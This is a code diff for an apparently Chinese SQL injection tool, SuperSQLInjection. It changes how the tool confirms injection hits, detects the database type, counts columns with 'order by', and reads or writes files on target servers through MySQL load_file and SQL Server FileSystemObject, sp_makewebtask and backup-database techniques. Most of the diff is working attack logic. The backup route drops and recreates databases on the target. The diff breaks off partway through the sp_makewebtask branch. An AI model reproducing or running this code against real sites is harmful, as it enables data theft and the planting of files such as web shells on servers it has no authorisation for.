@@ -18,6 +18,7 @@ using Amib.Threading;
 using System.Management;
 using Microsoft.Win32;
 using System.Drawing;
+using System.Reflection;
 
 namespace SuperSQLInjection
 {
@@ -110,7 +111,6 @@ namespace SuperSQLInjection
             this.cbox_basic_timeOut.SelectedIndex = 4;
             this.cbox_basic_reTryCount.SelectedIndex = 1;
             this.data_dbs_cob_db_encoding.SelectedIndex = 0;
-            this.file_cbox_readWrite.SelectedIndex = 0;
             this.bypass_cbox_sendHTTPSleepTime.SelectedIndex = 0;
             this.cbox_bypass_urlencode_count.SelectedIndex = 0;
             this.cbox_base64Count.SelectedIndex = 0;
@@ -230,7 +230,7 @@ namespace SuperSQLInjection
             return sid;
         }
 
-        public static int version = 20181216;
+        public static int version = 20181221;
         public static string versionURL = "http://www.shack2.org/soft/getNewVersion?ENNAME=SSuperSQLInjection&NO=" + URLEncode.UrlEncode(getSid()) + "&VERSION=" + version;
         //检查更新
         public void checkUpdate()
@@ -2143,7 +2143,7 @@ namespace SuperSQLInjection
                 olen = len;
                 payload = ByPassForBetween(payLoadStr, len);
                 ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-                Boolean exists = Tools.isTrue(server, config.key, config.reverseKey, config.keyType);
+                Boolean exists = Tools.isTrue(server, config.key, config.reverseKey, config.keyType, config.injectHTTPCode);
                 if (exists)
                 {
                     if (len == start)
@@ -2177,7 +2177,7 @@ namespace SuperSQLInjection
 
             String payload = ByPassForBetween(payLoadStr, len);
             ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-            Boolean exists = Tools.isTrue(server, config.key, config.reverseKey, config.keyType);
+            Boolean exists = Tools.isTrue(server, config.key, config.reverseKey, config.keyType,config.injectHTTPCode);
             return exists;
 
         }
@@ -2209,7 +2209,7 @@ namespace SuperSQLInjection
             {
                 payload = ByPassForBetween(payLoadStr, start);
                 ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-                if (Tools.isTrue(server, config.key, config.reverseKey, config.keyType))
+                if (Tools.isTrue(server, config.key, config.reverseKey, config.keyType, config.injectHTTPCode))
                 {
                     start += step;
                 }
@@ -2273,7 +2273,7 @@ namespace SuperSQLInjection
                     return false;
                 }
 
-                return Tools.isTrue(server, config.key, config.reverseKey, config.keyType);
+                return Tools.isTrue(server, config.key, config.reverseKey, config.keyType, config.injectHTTPCode);
 
             }
             return false;
@@ -2304,7 +2304,7 @@ namespace SuperSQLInjection
                     return false;
                 }
 
-                return Tools.isTrue(server, config.key, config.reverseKey, config.keyType);
+                return Tools.isTrue(server, config.key, config.reverseKey, config.keyType, config.injectHTTPCode);
 
             }
 
@@ -3292,7 +3292,7 @@ namespace SuperSQLInjection
             try
             {
                 SelectNode sn = (SelectNode)osn;
-                String data_payload = SQLServer.column_value.Replace("{index}", sn.limit.ToString()).Replace("{dbname}", sn.dbname).Replace("{table}", sn.tableName);
+                String data_payload = SQLServer.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}..{table}'", Tools.strToChar(sn.dbname + ".." + sn.columnName, "UTF-8")).Replace("{dbname}", sn.dbname);
                 int len = getValueByStepUp(SQLServer.bool_length.Replace("{data}", data_payload), 0, 10);
                 String value = "";
                 //获取值
@@ -3338,7 +3338,7 @@ namespace SuperSQLInjection
             try
             {
                 SelectNode sn = (SelectNode)osn;
-                String data_payload = SQLServer.column_value.Replace("{index}", sn.limit.ToString()).Replace("{dbname}", sn.dbname).Replace("{table}", sn.tableName);
+                String data_payload = SQLServer.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}..{table}'", Tools.strToChar(sn.dbname + ".." + sn.columnName, "UTF-8")).Replace("{dbname}", sn.dbname);
                 int len = getValueByStepUp(SQLServer.getBoolDataBySleep(SQLServer.bool_length.Replace("{data}", data_payload), config.maxTime), 0, 10);
                 String value = "";
                 //获取值
@@ -3456,7 +3456,7 @@ namespace SuperSQLInjection
             {
                 SelectNode sn = (SelectNode)osn;
 
-                String column_Name_data = SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.column_value, sn.dbname, sn.tableName, sn.limit.ToString());
+                String column_Name_data = SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.column_value.Replace("'{dbname}..{table}'", Tools.strToChar(sn.dbname + ".." + sn.tableName, "UTF-8")), sn.dbname, sn.tableName, sn.limit.ToString());
                 String result = getOneDataByUnionOrError(column_Name_data);
                 this.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                 this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
@@ -3539,7 +3539,7 @@ namespace SuperSQLInjection
             try
             {
                 SelectNode sn = (SelectNode)osn;
-                String result = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", SQLServer.column_value.Replace("{index}", sn.limit.ToString()).Replace("{dbname}", sn.dbname).Replace("{table}", sn.tableName)));
+                String result = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", SQLServer.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}..{table}'", Tools.strToChar(sn.dbname + ".." + sn.tableName, "UTF-8"))).Replace("{dbname}", sn.dbname));
                 this.Invoke(new showLogDelegate(log), "发现列：" + result,LogLevel.info);
                 this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
             }
@@ -3632,11 +3632,11 @@ namespace SuperSQLInjection
                             case DBType.SQLServer:
                                 if (KeyType.Time.Equals(config.keyType))
                                 {
-                                    columns_count = getValueByStepUp(SQLServer.getBoolDataBySleep(SQLServer.bool_columns_count.Replace("{dbname}", dbName).Replace("{table}", tableName), config.maxTime), 0, 20);
+                                    columns_count = getValueByStepUp(SQLServer.getBoolDataBySleep(SQLServer.bool_columns_count.Replace("'{dbname}..{table}'", Tools.strToChar(dbName+".."+ tableName,"UTF-8")).Replace("{dbname}", dbName), config.maxTime), 0, 20);
                                 }
                                 else
                                 {
-                                    columns_count = getValueByStepUp(SQLServer.bool_columns_count.Replace("{dbname}", dbName).Replace("{table}", tableName), 0, 20);
+                                    columns_count = getValueByStepUp(SQLServer.bool_columns_count.Replace("'{dbname}..{table}'", Tools.strToChar(dbName + ".." + tableName, "UTF-8")).Replace("{dbname}", dbName), 0, 20);
                                 }
 
                                 this.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "发现" + columns_count + "个列！", LogLevel.info);
@@ -3749,7 +3749,7 @@ namespace SuperSQLInjection
                                 stp.WaitForIdle();
                                 break;
                             case DBType.SQLServer:
-                                columns_count_payload = SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.columns_count, dbName, tableName, "");
+                                columns_count_payload = SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.columns_count.Replace("'{dbname}..{table}'", Tools.strToChar(dbName + ".." + tableName, "UTF-8")), dbName, tableName, "");
                                 result = getOneDataByUnionOrError(columns_count_payload);
 
                                 this.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
@@ -3852,7 +3852,8 @@ namespace SuperSQLInjection
                                 stp.WaitForIdle();
                                 break;
                             case DBType.SQLServer:
-                                result = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", SQLServer.columns_count.Replace("{dbname}", dbName).Replace("{table}", tableName)));
+                                String columns_count_data = SQLServer.columns_count.Replace("'{dbname}..{table}'", Tools.strToChar(dbName + ".." + tableName, "UTF-8")).Replace("{dbname}", dbName);
+                                result = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}",columns_count_data));
                                 //HTML解码
                                 result = HttpUtility.HtmlDecode(result);
                                 this.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
@@ -5359,6 +5360,7 @@ namespace SuperSQLInjection
         {
             try
             {
+                status = 1;
                 selectInjectType(InjectType.UnKnow);
                 selectDB("UnKnow");
                 //判断提交数据内型
@@ -5549,25 +5551,15 @@ namespace SuperSQLInjection
                                     foreach (String cdpay in dbpayload_list)
                                     {
                                         ServerInfo dbServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, pals[0].Replace("1=1", cdpay), payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-                                        if (config.useCode && trueServer.code == dbServer.code)
+
+                                        Boolean istrue=Tools.isTrue(dbServer, config.key, config.reverseKey, config.keyType, config.injectHTTPCode);
+                                        if (istrue)
                                         {
                                             this.Invoke(new showLogDelegate(log), "程序判断数据库为" + db + "数据库", LogLevel.success);
                                             currentDB = db;
                                             selectDB(currentDB);
                                             break;
                                         }
-                                        else if (dbServer.length >= oserver.length && dbServer.code == oserver.code)
-                                        {
-                                            //根据关键字判断
-                                            if (dbServer.body.IndexOf(config.key) != -1)
-                                            {
-                                                this.Invoke(new showLogDelegate(log), "程序判断数据库为" + db + "数据库", LogLevel.success);
-                                                currentDB = db;
-                                                selectDB(currentDB);
-                                                break;
-                                            }
-                                        }
-
                                     }
                                 }
                                 //用于标记注入的新字符
@@ -5653,7 +5645,7 @@ namespace SuperSQLInjection
                                
                                 String[] pals = cpal.Split(':');
                                 //如果已经识别出了数据库类型，根据对应的数据库类型加载错误显示payload
-                                if (!config.dbType.ToString().Equals(pals[3])) {
+                                if (!config.dbType.ToString().Equals(pals[3])&& !config.dbType.Equals(DBType.UnKnow)) {
                                     continue;
                                 }
                                 ServerInfo errorServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, pals[0], payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
@@ -5696,19 +5688,13 @@ namespace SuperSQLInjection
 
                     //union注入
                     String payload = "";
-
-                    if (DBType.SQLServer.ToString().Equals(currentDB))
-                    {
-                        payload = unionStartPayLoad + "{payload}--";
-
-                    }
-                    else if ("MySQL".Equals(currentDB))
+                    if ("MySQL".Equals(currentDB))
                     {
                         payload = unionStartPayLoad + "{payload}#";
                     }
                     else if ("Access".Equals(currentDB))
                     {
-                        //处理%16不能被URL
+                        //处理%16不能被URL编码
                         payload = unionStartPayLoad + "{payload}";
                     }
                     else
@@ -5716,9 +5702,30 @@ namespace SuperSQLInjection
                         payload = unionStartPayLoad + "{payload}-- -";
 
                     }
+                    //如果是已经识别出来bool注入，尝试使用orderby判断列数量，提高效率
+                    int order = 0;
+                    if (boolInject)
+                    {
+                        String orderpayload = " 1=1 order by {len}";
+                        if ("Access".Equals(currentDB))
+                        {
+                            //%16
+                            orderpayload = orderpayload + HttpUtility.UrlDecode("%16",Encoding.UTF8);
+                        }
+                        else {
+                            orderpayload = orderpayload + "-- -";
+                        }
+                        order = getValue(orderpayload, 1, config.maxClolumns);
+                    }
+                    int startIndex = 1;
+                    if (order-1>0) {
+                        startIndex = order - 1;
+                        this.Invoke(new showLogDelegate(log), "注入点支持order by判断，自动判断查询有"+ startIndex + "列！", LogLevel.success);  
+                    }
+
                     //判断总列数
                     Boolean isFind = false;
-                    for (int i = 1; i <= config.maxClolumns; i++)
+                    for (int i = startIndex; i <= config.maxClolumns; i++)
                     {
                         if (isFind)
                         {
@@ -5768,10 +5775,10 @@ namespace SuperSQLInjection
                         }
                         else
                         {
+                            ServerInfo unionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                             for (int j = 1; j <= i; j++)
                             {
                                 String basecolumn = (basestr + j).ToString();
-                                ServerInfo unionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                                 if (unionServer.code == 200 && unionServer.body.IndexOf((basecolumn)) != -1)
                                 {
                                     isFind = true;
@@ -5874,7 +5881,6 @@ namespace SuperSQLInjection
 
         private void data_dbs_tsl_getDatas_Click(object sender, EventArgs e)
         {
-
             if (stp.InUseThreads == 0)
             {
 
@@ -5991,6 +5997,33 @@ namespace SuperSQLInjection
         private void cbox_basic_dbType_SelectedIndexChanged(object sender, EventArgs e)
         {
             config.dbType = (DBType)this.cbox_basic_dbType.SelectedIndex;
+            //文件读取，选择修改
+            try
+            {
+                Type type = Type.GetType("SuperSQLInjection.payload." + config.dbType.ToString());
+                MethodInfo mf = type.GetMethod("getShowCanDoFile");
+                List<String> list = (List<String>)mf.Invoke(null, null);
+                this.file_cbox_readWrite.Items.Clear();
+                if (list != null && list.Count > 0)
+                {
+                    this.file_cbox_readWrite.Enabled = true;
+                    this.file_cbox_readWrite.Items.Add("请选择读写文件方式");
+                    this.file_cbox_readWrite.Items.AddRange(list.ToArray());
+                    
+                }
+                else {
+                    this.file_cbox_readWrite.Items.Add("此数据库类型暂不支持文件读写！");
+                   
+                }
+            }
+            catch (Exception ee) {
+               
+                this.file_cbox_readWrite.Items.Clear();
+                this.file_cbox_readWrite.Items.Add("此数据库类型暂不支持文件读写！");
+                
+                Tools.SysLog(ee.Message);
+            }
+            this.file_cbox_readWrite.SelectedIndex = 0;
         }
         private void txt_inject_unionColumnsCount_TextChanged(object sender, EventArgs e)
         {
@@ -6489,6 +6522,11 @@ namespace SuperSQLInjection
             this.file_txt_result.Text = text;
         }
 
+        public void file_txt_resultAppendText(String text)
+        {
+            this.file_txt_result.AppendText(text+"\r\n");
+        }
+
         public void cmd_txt_resultSetText(String text)
         {
             this.cmd_txt_result.Text = text;
@@ -6504,215 +6542,397 @@ namespace SuperSQLInjection
             {
                 Thread.CurrentThread.Name = "FileThread-";
             }
-            if (this.file_cbox_readWrite.SelectedIndex == 0)
-            {
-                data_payload = MySQL.hex.Replace("{data}", "load_file(" + path_16 + ")");
-                switch (config.injectType)
-                {
-                    case InjectType.Bool:
-                        try
-                        {
-                            if (String.IsNullOrEmpty(config.key))
-                            {
-                                MessageBox.Show("大侠，请在注入中心，配置Bool盲注的判断值！");
-                                return;
-                            }
-                            String payload_len = MySQL.ver_length.Replace("{data}", data_payload);
-                            int len = 0;
-                            //延时注入
-                            if (config.keyType.Equals(KeyType.Time))
-                            {
-                                len = getValueByStepUp(MySQL.getBoolCountBySleep(payload_len, config.maxTime), 0, 50000);
-                            }
-                            else {
-                                len = getValueByStepUp(payload_len, 0, 50000);
-                            }
-                           
-                            this.dataCount = len;
-                            String value = "";
-                            ver_tmp = new String[len];
-                            //获取值
-                            for (int i = 0; i < len; i++)
-                            {
-                                stp.WaitFor(100);
-                                stp.QueueWorkItem<string>(readOrWriteFileByMySQLByHexAscii, data_payload + "#" + i);
-                            }
-                            stp.WaitForIdle();
-                            if (ver_tmp != null)
-                            {
-                                value = Tools.unHex(Tools.convertToString(ver_tmp), config.readFileEncoding);
-                            }
-                            this.Invoke(new StringDelegate(file_txt_resultSetText), value);
-                            this.Invoke(new showLogDelegate(log), this.file_cbox_readWrite.Text + "完成！", LogLevel.success);
 
-                        }
-                        catch (Exception e)
-                        {
-                            this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message,LogLevel.error);
-                        }
-                        break;
-                    case InjectType.Union:
-                        try
-                        {
-                            if (config.columnsCount <= 0)
-                            {
-                                MessageBox.Show("大侠，请在注入中心，配置Union注入的列数！");
-                                return;
-                            }
+            switch (config.dbType) {
 
-                            String result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", MySQL.creatMySQLReadFileByUnion(config.columnsCount, config.showColumn, config.unionFill, "convert(load_file(" + path_16 + ") using UTF8)")));
-                            this.dataCount = result.Length;
-                            this.currentDataCount = result.Length;
-                            this.Invoke(new StringDelegate(file_txt_resultSetText), result);
-                            this.Invoke(new showLogDelegate(log), "报告大侠，获取到文件数据!", LogLevel.success);
-                        }
-                        catch (Exception e)
-                        {
-                            this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message,LogLevel.error);
-                        }
-                        break;
-                    case InjectType.Error:
-                        try
-                        {
-                            String payload_len = MySQL.char_length.Replace("{data}", data_payload);
-                            String payload_len_error = MySQL.error_value.Replace("{data}", MySQL.concatMySQLColumn(payload_len));
-
-                            String result_length = getOneDataByUnionOrError(payload_len_error);
-
-
-                            int sumlen = Tools.convertToInt(result_length);
-                            this.dataCount = sumlen;
-                            String result = "";
-
-                            int start = 1;
-                            //每次获取长度，err方式有长度限制
-                            int count = 64 - 6;
-                            this.Invoke(new showLogDelegate(log), "报告大侠，正在获取数据，每次请求将获取" + count + "字符！", LogLevel.info);
-                            while (start < sumlen)
-                            {
-                                //hex编码，防止中文等乱码
-                                String datas_value_tmp = ByPassForBetween(MySQL.creatMySQLColumnCastStr(MySQL.substr_value.Replace("{data}", data_payload).Replace("{start}", start.ToString())), count);
-                                String c_datas_value_payload = MySQL.error_value.Replace("{data}", datas_value_tmp);
-                                result += getOneDataByUnionOrError(c_datas_value_payload);
-                                start += count;
-                                this.currentDataCount = result.Length;
-                                this.Invoke(new StringDelegate(file_txt_resultSetText), Tools.unHex(result, config.readFileEncoding));
-                            }
-                            //查找格式^^^col$$$col^^^
-                            result = Tools.unHex(result, config.readFileEncoding);
-                            Match m = Regex.Match(result, "(?<=(\\^\\^\\!))[.\\s\\S]*?(?=(\\!\\^\\^))");
-                            if (m.Success)
-                            {
-                                result = m.Value;
-                            }
-                            this.Invoke(new StringDelegate(file_txt_resultSetText), result);
-                            this.Invoke(new showLogDelegate(log), "获取文件内容！", LogLevel.info);
-                        }
-                        catch (Exception e)
-                        {
-
-                            this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message,LogLevel.error);
-                        }
-                        break;
-
-                }
-            }
-            else if (this.file_cbox_readWrite.SelectedIndex == 1)
-            {
-                //union方式写文件
-                if (config.injectType.Equals(InjectType.Union))
-                {
-                    if (!String.IsNullOrEmpty(this.file_txt_result.Text))
+                case DBType.MySQL:
+                    if (this.file_cbox_readWrite.SelectedIndex == 1)
                     {
-                        String payload = MySQL.creatMySQLWriteFileByUnion(config.columnsCount, config.showColumn, config.unionFill, path, this.file_txt_result.Text);
+                        data_payload = MySQL.hex.Replace("{data}", "load_file(" + path_16 + ")");
+                        switch (config.injectType)
+                        {
+                            case InjectType.Bool:
+                                try
+                                {
+                                    if (String.IsNullOrEmpty(config.key))
+                                    {
+                                        MessageBox.Show("大侠，请在注入中心，配置Bool盲注的判断值！");
+                                        return;
+                                    }
+                                    String payload_len = MySQL.ver_length.Replace("{data}", data_payload);
+                                    int len = 0;
+                                    //延时注入
+                                    if (config.keyType.Equals(KeyType.Time))
+                                    {
+                                        len = getValueByStepUp(MySQL.getBoolCountBySleep(payload_len, config.maxTime), 0, 50000);
+                                    }
+                                    else
+                                    {
+                                        len = getValueByStepUp(payload_len, 0, 50000);
+                                    }
+
+                                    this.dataCount = len;
+                                    String value = "";
+                                    ver_tmp = new String[len];
+                                    //获取值
+                                    for (int i = 0; i < len; i++)
+                                    {
+                                        stp.WaitFor(100);
+                                        stp.QueueWorkItem<string>(readOrWriteFileByMySQLByHexAscii, data_payload + "#" + i);
+                                    }
+                                    stp.WaitForIdle();
+                                    if (ver_tmp != null)
+                                    {
+                                        value = Tools.unHex(Tools.convertToString(ver_tmp), config.readFileEncoding);
+                                    }
+                                    this.Invoke(new StringDelegate(file_txt_resultSetText), value);
+                                    this.Invoke(new showLogDelegate(log), this.file_cbox_readWrite.Text + "完成！", LogLevel.success);
+
+                                }
+                                catch (Exception e)
+                                {
+                                    this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+                                }
+                                break;
+                            case InjectType.Union:
+                                try
+                                {
+                                    if (config.columnsCount <= 0)
+                                    {
+                                        MessageBox.Show("大侠，请在注入中心，配置Union注入的列数！");
+                                        return;
+                                    }
+
+                                    String result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", MySQL.creatMySQLReadFileByUnion(config.columnsCount, config.showColumn, config.unionFill, "convert(load_file(" + path_16 + ") using UTF8)")));
+                                    this.dataCount = result.Length;
+                                    this.currentDataCount = result.Length;
+                                    this.Invoke(new StringDelegate(file_txt_resultSetText), result);
+                                    this.Invoke(new showLogDelegate(log), "报告大侠，获取到文件数据!", LogLevel.success);
+                                }
+                                catch (Exception e)
+                                {
+                                    this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+                                }
+                                break;
+                            case InjectType.Error:
+                                try
+                                {
+                                    String payload_len = MySQL.char_length.Replace("{data}", data_payload);
+                                    String payload_len_error = MySQL.error_value.Replace("{data}", MySQL.concatMySQLColumn(payload_len));
+
+                                    String result_length = getOneDataByUnionOrError(payload_len_error);
+
+
+                                    int sumlen = Tools.convertToInt(result_length);
+                                    this.dataCount = sumlen;
+                                    String result = "";
+
+                                    int start = 1;
+                                    //每次获取长度，err方式有长度限制
+                                    int count = 64 - 6;
+                                    this.Invoke(new showLogDelegate(log), "报告大侠，正在获取数据，每次请求将获取" + count + "字符！", LogLevel.info);
+                                    while (start < sumlen)
+                                    {
+                                        //hex编码，防止中文等乱码
+                                        String datas_value_tmp = ByPassForBetween(MySQL.creatMySQLColumnCastStr(MySQL.substr_value.Replace("{data}", data_payload).Replace("{start}", start.ToString())), count);
+                                        String c_datas_value_payload = MySQL.error_value.Replace("{data}", datas_value_tmp);
+                                        result += getOneDataByUnionOrError(c_datas_value_payload);
+                                        start += count;
+                                        this.currentDataCount = result.Length;
+                                        this.Invoke(new StringDelegate(file_txt_resultSetText), Tools.unHex(result, config.readFileEncoding));
+                                    }
+                                    //查找格式^^^col$$$col^^^
+                                    result = Tools.unHex(result, config.readFileEncoding);
+                                    Match m = Regex.Match(result, "(?<=(\\^\\^\\!))[.\\s\\S]*?(?=(\\!\\^\\^))");
+                                    if (m.Success)
+                                    {
+                                        result = m.Value;
+                                    }
+                                    this.Invoke(new StringDelegate(file_txt_resultSetText), result);
+                                    this.Invoke(new showLogDelegate(log), "获取文件内容！", LogLevel.info);
+                                }
+                                catch (Exception e)
+                                {
+
+                                    this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+                                }
+                                break;
+
+                        }
+                    }
+                    else if (this.file_cbox_readWrite.SelectedIndex == 2)
+                    {
+                        //union方式写文件
+                        if (config.injectType.Equals(InjectType.Union))
+                        {
+                            if (!String.IsNullOrEmpty(this.file_txt_result.Text))
+                            {
+                                String payload = MySQL.creatMySQLWriteFileByUnion(config.columnsCount, config.showColumn, config.unionFill, path, this.file_txt_result.Text);
+                                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                                MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
+                            }
+                            else
+                            {
+                                MessageBox.Show("请在下面输入您要写入文件的内容，请注意，GET方式的注入提交数据不能超过1024个字节！");
+                            }
+                        }
+                        else
+                        {
+
+                            MessageBox.Show("大侠此种方式写文件，只支持Union注入！");
+                        }
+                    }
+                    break;
+
+                case DBType.SQLServer:
+                    if (this.file_cbox_readWrite.SelectedIndex == 1)
+                    {
+                        //filesystemobject写文件
+                        if (!String.IsNullOrEmpty(this.file_txt_result.Text))
+                        {
+                            String payload = SQLServer.witeFileByFileSystemObject.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
+                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                            MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
+                        }
+                        else
+                        {
+                            MessageBox.Show("请在下面输入您要写入文件的内容，请注意，GET方式的注入提交数据不能超过1024个字节！");
+                        }
+                       
+                    }
+                    else if (this.file_cbox_readWrite.SelectedIndex == 2)
+                    {
+                        //sp_makewebtask写文件
+                        if (!String.IsNullOrEmpty(this.file_txt_result.Text))
+                        {
+                            String payload = SQLServer.witeFileBySP_MakeWebTask.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
+                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                            MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
+                        }
+                        else
+                        {
+                            MessageBox.Show("请在下面输入您要写入文件的内容，请注意，GET方式的注入提交数据不能超过1024个字节！");
+                        }
+                       
+                    }
+                    else if (this.file_cbox_readWrite.SelectedIndex == 3)
+                    {
+                        //backup database写文件
+                        if (!String.IsNullOrEmpty(this.file_txt_result.Text))
+                        {
+                            String payload = SQLServer.witeFileByBackDataBase.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
+                            //删库删表
+                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.dropWriteFileBackUpTableAndDropDB, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                            //建库建表
+                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.createWriteFileBackUpDB, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.createWriteFileBackUpTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+
+                            //执行备份写
+                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                            //删库删表
+                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.dropWriteFileBackUpTableAndDropDB, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                            MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
+                        }
+                        else
+                        {
+                            MessageBox.Show("请在下面输入您要写入文件的内容，请注意，GET方式的注入提交数据不能超过1024个字节！");
+                        }
+                       
+                    }
+                    else if (this.file_cbox_readWrite.SelectedIndex == 4)
+                    {
+                        //filesystemobject读文件
+                        String payload = SQLServer.readFileByFileSystemobject.Replace("{path}", path);
+                        HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.dropTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                         HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-                        MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
+                        switch (config.injectType)
+                        {
+                            case InjectType.Bool:
+
+                                //取每一列的值
+                                data_payload = SQLServer.file_content;
+                                String payload_len = SQLServer.bool_dataLength.Replace("{data}", data_payload);
+                                int len = 0;
+                                if (config.keyType.Equals(KeyType.Time))
+                                {
+                                    len = getValue(SQLServer.getBoolDataBySleep(payload_len, config.maxTime), 0, 1024 * 100);
+                                }
+                                else
+                                {
+                                    len = getValue(payload_len, 0, 1024 * 100);
+                                }
+
+                                ver_tmp = new String[len];
+                                this.dataCount = len;
+                                this.Invoke(new showLogDelegate(log), "读到文件内容，长度为" + len + "字节！", LogLevel.info);
+                                //获取值
+                                for (int i = 1; i <= len; i++)
+                                {
+                                    stp.QueueWorkItem<object>(getFileContentBoolBySQLServer, i);
+                                    this.currentDataCount = i;
+                                }
+                                stp.WaitForIdle();
+                                break;
+
+                            case InjectType.Union:
+                                String unionresult = getOneDataByUnionOrError(SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.file_content));
+                                this.Invoke(new StringDelegate(file_txt_resultSetText), unionresult);
+                                this.Invoke(new showLogDelegate(log), "获取到读取的文件内容，长度为" + unionresult.Length + "字节！", LogLevel.info);
+                                break;
+                            case InjectType.Error:
+
+                                String errorresult = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", SQLServer.file_content));
+                                this.Invoke(new StringDelegate(file_txt_resultSetText), errorresult);
+                                this.Invoke(new showLogDelegate(log), "获取到读取的文件内容，长度为" + errorresult.Length + "字节！", LogLevel.info);
+                                break;
+                        }
                     }
-                    else
+                    break;
+
+                case DBType.PostgreSQL:
+                    if (this.file_cbox_readWrite.SelectedIndex == 1)
                     {
-                        MessageBox.Show("请在下面输入您要写入文件的内容，请注意，GET方式的注入提交数据不能超过1024个字节！");
-                    }
-                }
-                else
-                {
-
-                    MessageBox.Show("大侠此种方式写文件，只支持Union注入！");
-                }
-            }
-            else if (this.file_cbox_readWrite.SelectedIndex == 2)
-            {
-                //filesystemobject写文件
-                String payload = SQLServer.witeFileByFileSystemObject.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
-                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-                MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
-            }
-            else if (this.file_cbox_readWrite.SelectedIndex == 3)
-            {
-                //sp_makewebtask写文件
